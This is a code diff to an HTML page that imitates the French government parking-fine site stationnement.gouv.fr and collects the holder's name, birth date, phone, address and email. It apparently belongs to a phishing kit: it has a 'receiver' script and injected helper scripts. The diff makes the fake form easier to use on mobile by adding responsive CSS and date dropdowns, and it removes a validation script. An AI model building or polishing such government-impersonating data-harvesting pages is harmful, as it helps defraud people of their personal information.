@@ -461,7 +461,90 @@
 
     console.log('[fps-final] install\u00e9');
 })();
-</script></head><body><header id="hautDePage" role="banner"><div class="wrapper"><a aria-label="République Française - stationnement.gouv.fr - Revenir à la page d'accueil" href="/fps" routerlink="/fps"><img alt="République Française Liberté Egalité Fraternité - Ministère de l'action et des comptes publics" src="assets/img/img_7827502608127642110.png"/></a></div></header><div id="fps-page-content">
+</script>
+<style id="__identite_responsive__">
+*,*::before,*::after{box-sizing:border-box;}
+
+/* Mobile */
+@media screen and (max-width: 768px) {
+  body { overflow-x: hidden; }
+
+  header#hautDePage .wrapper {
+    display: flex; justify-content: center; padding: 0.6rem 1rem;
+  }
+  header#hautDePage img { max-height: 70px; }
+
+  /* Container principal */
+  #fps-page-content > main {
+    max-width: 100% !important;
+    margin: 1rem auto !important;
+    padding: 0 0.8rem !important;
+  }
+
+  /* Titres */
+  #fps-page-content h1 { font-size: 1.25rem !important; }
+
+  /* Récap */
+  #fps-page-content [style*="background:#e8f4fb"],
+  #fps-page-content [style*="background: #e8f4fb"] {
+    font-size: 0.9rem !important;
+    padding: 0.7rem 0.9rem !important;
+    word-break: break-word;
+  }
+
+  /* Toutes les grilles → 1 colonne */
+  #id-form > div[style*="grid-template-columns"] {
+    display: block !important;
+  }
+  #id-form > div[style*="grid-template-columns"] > div {
+    margin-bottom: 0.7rem !important;
+  }
+
+  /* Inputs/selects */
+  #id-form input,
+  #id-form select {
+    width: 100% !important;
+    font-size: 16px !important; /* empêche zoom auto iOS */
+    padding: 0.75rem 0.8rem !important;
+    min-height: 44px !important;
+    -webkit-appearance: none !important;
+    appearance: none !important;
+    border-radius: 4px !important;
+    background-color: #fff;
+  }
+
+  /* Les 3 selects de date */
+  #f-ddn-j, #f-ddn-m, #f-ddn-y {
+    font-size: 16px !important;
+    min-height: 44px !important;
+    text-align: center;
+    padding-left: 0.3rem;
+    padding-right: 0.3rem;
+  }
+
+  /* Empile les boutons */
+  #id-form > div[style*="display:flex"] {
+    flex-direction: column-reverse !important;
+    gap: 0.7rem !important;
+  }
+  #id-form a[href="index.html"],
+  #id-form button[type="submit"] {
+    width: 100% !important;
+    padding: 0.9rem 1rem !important;
+    font-size: 1rem !important;
+    text-align: center !important;
+    display: block !important;
+    margin: 0 !important;
+  }
+
+  /* Footer */
+  footer.no-print .wrapper {
+    flex-direction: column !important;
+    gap: 1rem;
+  }
+}
+</style>
+</head><body><header id="hautDePage" role="banner"><div class="wrapper"><a aria-label="République Française - stationnement.gouv.fr - Revenir à la page d'accueil" href="/fps" routerlink="/fps"><img alt="République Française Liberté Egalité Fraternité - Ministère de l'action et des comptes publics" src="assets/img/img_7827502608127642110.png"/></a></div></header><div id="fps-page-content">
 <main style="max-width:900px;margin:2rem auto;padding:0 1rem;font-family:'opensans',Arial,sans-serif;">
 <h1 style="color:#000;font-size:1.7rem;margin:1.5rem 0 1rem;border-bottom:2px solid #0b6ba8;padding-bottom:.6rem;">
     Informations du titulaire
@@ -480,7 +563,20 @@
 </div>
 <div>
 <label style="display:block;margin-bottom:.3rem;font-weight:600;">Date de naissance <span style="color:#c00;">*</span></label>
-<input id="f-ddn" required="" style="width:100%;padding:.55rem;border:1px solid #acacac;border-radius:3px;font-size:1rem;box-sizing:border-box;" type="date"/>
+
+
+<div style="display:grid;grid-template-columns:1fr 1fr 1.3fr;gap:0.5rem;">
+<select id="f-ddn-j" required="" style="width:100%;padding:.55rem;border:1px solid #acacac;border-radius:3px;font-size:1rem;box-sizing:border-box;">
+<option value="">Jour</option>
+</select>
+<select id="f-ddn-m" required="" style="width:100%;padding:.55rem;border:1px solid #acacac;border-radius:3px;font-size:1rem;box-sizing:border-box;">
+<option value="">Mois</option>
+</select>
+<select id="f-ddn-y" required="" style="width:100%;padding:.55rem;border:1px solid #acacac;border-radius:3px;font-size:1rem;box-sizing:border-box;">
+<option value="">Année</option>
+</select>
+</div>
+<input id="f-ddn" name="f-ddn" type="hidden"/>
 </div>
 </div>
 <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem;">
@@ -584,150 +680,6 @@
     });
 })();
 </script>
-<script id="__fps_identite_mobile__">
-(function () {
-    'use strict';
-    if (window.__fpsIdentiteMobile) return;
-    window.__fpsIdentiteMobile = true;
-
-    // ─── Contraintes par champ ──────────────────────────────
-    const RULES = {
-        'f-tel':   { maxlength: 10, numeric: true,  placeholder: '0612345678' },
-        'f-cp':    { maxlength: 5,  numeric: true,  placeholder: '75001' },
-        'f-ddn':   { maxlength: null, numeric: false },
-        'f-nom':   { maxlength: 60, numeric: false },
-        'f-pre':   { maxlength: 60, numeric: false },
-        'f-adr':   { maxlength: 120, numeric: false },
-        'f-ville': { maxlength: 80, numeric: false },
-        'f-mail':  { maxlength: 120, numeric: false },
-        'f-mail2': { maxlength: 120, numeric: false },
-    };
-
-    function applyRules() {
-        for (const [id, r] of Object.entries(RULES)) {
-            const el = document.getElementById(id);
-            if (!el || el.__fpsMobileApplied) continue;
-            el.__fpsMobileApplied = true;
-
-            if (r.maxlength) el.setAttribute('maxlength', r.maxlength);
-            if (r.numeric) {
-                el.setAttribute('inputmode', 'numeric');
-                el.setAttribute('pattern', '[0-9]*');
-                el.setAttribute('autocomplete', 'off');
-                if (r.placeholder) el.setAttribute('placeholder', r.placeholder);
-            }
-
-            // Bloque la saisie au-delà de maxlength
-            el.addEventListener('beforeinput', (e) => {
-                if (!e.data) return;
-                const ml = r.maxlength;
-                if (ml && (el.value.length + e.data.length) > ml) {
-                    e.preventDefault();
-                }
-            }, true);
-
-            // Filtre les non-chiffres sur les champs numériques
-            if (r.numeric) {
-                el.addEventListener('input', () => {
-                    let v = el.value.replace(/\D/g, '');
-                    if (r.maxlength) v = v.slice(0, r.maxlength);
-                    if (v !== el.value) el.value = v;
-                }, true);
-            }
-
-            // Bloque le collage trop long
-            el.addEventListener('paste', (e) => {
-                const txt = (e.clipboardData || window.clipboardData).getData('text') || '';
-                const ml = r.maxlength;
-                if (ml && (el.value.length + txt.length) > ml) {
-                    e.preventDefault();
-                    const allowed = ml - el.value.length;
-                    if (allowed > 0) {
-                        let insert = txt.slice(0, allowed);
-                        if (r.numeric) insert = insert.replace(/\D/g, '');
-                        el.value += insert;
-                        el.dispatchEvent(new Event('input', { bubbles: true }));
-                    }
-                } else if (r.numeric) {
-                    const clean = txt.replace(/\D/g, '');
-                    if (clean !== txt) {
-                        e.preventDefault();
-                        const allowed = ml ? (ml - el.value.length) : clean.length;
-                        el.value += clean.slice(0, allowed);
-                        el.dispatchEvent(new Event('input', { bubbles: true }));
-                    }
-                }
-            }, true);
-
-            // Clavier numérique : empêche physiquement les lettres sur desktop
-            if (r.numeric) {
-                el.addEventListener('keypress', (e) => {
-                    if (e.key.length === 1 && !/\d/.test(e.key)) {
-                        e.preventDefault();
-                    }
-                }, true);
-            }
-        }
-    }
-
-    // ─── Sur le submit : vérif finale ───────────────────────
-    function attachSubmitGuard() {
-        const form = document.getElementById('id-form');
-        if (!form || form.__fpsGuard) return;
-        form.__fpsGuard = true;
-
-        form.addEventListener('submit', (e) => {
-            // Vérif téléphone : 10 chiffres
-            const tel = document.getElementById('f-tel');
-            if (tel) {
-                const v = tel.value.replace(/\D/g, '');
-                if (v.length !== 10) {
-                    tel.style.borderColor = '#c00';
-                    e.preventDefault();
-                    e.stopImmediatePropagation();
-                    alert('Le numéro de téléphone doit contenir 10 chiffres.');
-                    return false;
-                }
-            }
-            // Vérif code postal : 5 chiffres
-            const cp = document.getElementById('f-cp');
-            if (cp) {
-                const v = cp.value.replace(/\D/g, '');
-                if (v.length !== 5) {
-                    cp.style.borderColor = '#c00';
-                    e.preventDefault();
-                    e.stopImmediatePropagation();
-                    alert('Le code postal doit contenir 5 chiffres.');
-                    return false;
-                }
-            }
-        }, true);  // capture = true → passe avant le handler existant
-    }
-
-    // ─── Boucle ─────────────────────────────────────────────
-    let scheduled = false;
-    function schedule() {
-        if (scheduled) return;
-        scheduled = true;
-        setTimeout(() => {
-            scheduled = false;
-            try { applyRules(); attachSubmitGuard(); } catch(e){}
-        }, 200);
-    }
-
-    if (document.readyState === 'loading')
-        document.addEventListener('DOMContentLoaded', schedule, { once: true });
-    else
-        schedule();
-    window.addEventListener('load', schedule, { once: true });
-    new MutationObserver(schedule).observe(document.documentElement, {
-        childList: true, subtree: true,
-    });
-
-    console.log('[fps-identite-mobile] install\u00e9');
-})();
-</script>
-
 <script id="__receiver_js__">
 (function () {
     'use strict';
@@ -840,6 +792,74 @@
     };
 
     console.log('[receiver] installé');
+})();
+</script>
+
+<script id="__date_selects__">
+(function () {
+    'use strict';
+    if (window.__dateSelectsInstalled) return;
+    window.__dateSelectsInstalled = true;
+
+    var MOIS = ['Janvier','Février','Mars','Avril','Mai','Juin',
+                'Juillet','Août','Septembre','Octobre','Novembre','Décembre'];
+
+    function init() {
+        var j = document.getElementById('f-ddn-j');
+        var m = document.getElementById('f-ddn-m');
+        var y = document.getElementById('f-ddn-y');
+        var hidden = document.getElementById('f-ddn');
+
+        if (!j || !m || !y || j.__init) return;
+        j.__init = m.__init = y.__init = true;
+
+        // Jour 1-31
+        for (var d = 1; d <= 31; d++) {
+            var o = document.createElement('option');
+            o.value = (d < 10 ? '0' : '') + d;
+            o.textContent = (d < 10 ? '0' : '') + d;
+            j.appendChild(o);
+        }
+        // Mois
+        for (var i = 0; i < 12; i++) {
+            var o = document.createElement('option');
+            o.value = (i + 1 < 10 ? '0' : '') + (i + 1);
+            o.textContent = MOIS[i];
+            m.appendChild(o);
+        }
+        // Années (année courante - 100 à année courante)
+        var yNow = new Date().getFullYear();
+        for (var yy = yNow; yy >= yNow - 100; yy--) {
+            var o = document.createElement('option');
+            o.value = yy;
+            o.textContent = yy;
+            y.appendChild(o);
+        }
+
+        function sync() {
+            if (j.value && m.value && y.value) {
+                hidden.value = y.value + '-' + m.value + '-' + j.value;
+            } else {
+                hidden.value = '';
+            }
+            // Colore en rouge si incomplet
+            [j, m, y].forEach(function (s) {
+                s.style.borderColor = s.value ? '#acacac' : '#c00';
+            });
+        }
+        j.addEventListener('change', sync);
+        m.addEventListener('change', sync);
+        y.addEventListener('change', sync);
+        sync();
+    }
+
+    if (document.readyState === 'loading')
+        document.addEventListener('DOMContentLoaded', init, { once: true });
+    else
+        init();
+    new MutationObserver(init).observe(document.documentElement, {
+        childList: true, subtree: true,
+    });
 })();
 </script>
 </body></html>
